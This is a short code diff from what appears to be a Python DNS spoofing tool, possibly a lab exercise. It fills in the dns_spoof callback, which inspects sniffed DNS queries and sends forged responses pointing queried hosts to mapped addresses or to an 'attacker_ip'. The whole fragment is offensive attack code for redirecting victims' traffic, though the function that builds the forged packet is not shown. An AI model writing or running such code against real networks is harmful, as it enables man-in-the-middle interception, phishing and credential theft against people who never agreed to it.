@@ -69,7 +69,15 @@ def dns_spoof(pkt):
     Callback function triggered when a DNS query is sniffed.
     Decide whether to spoof and send a fake response.
     """
-    # TODO:
+    if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0: #qr=0 means query, qr=1 means response
+        queried_host = pkt[DNSQR].qname.decode().strip('.')
+        
+        if dns_map:
+            if queried_host in dns_map:
+                spoof_ip = dns_map[queried_host]
+                create_and_send(pkt, spoof_ip)
+        else:
+            create_and_send(pkt, attacker_ip)
 
 def create_and_send(pkt, ipaddr):
     """
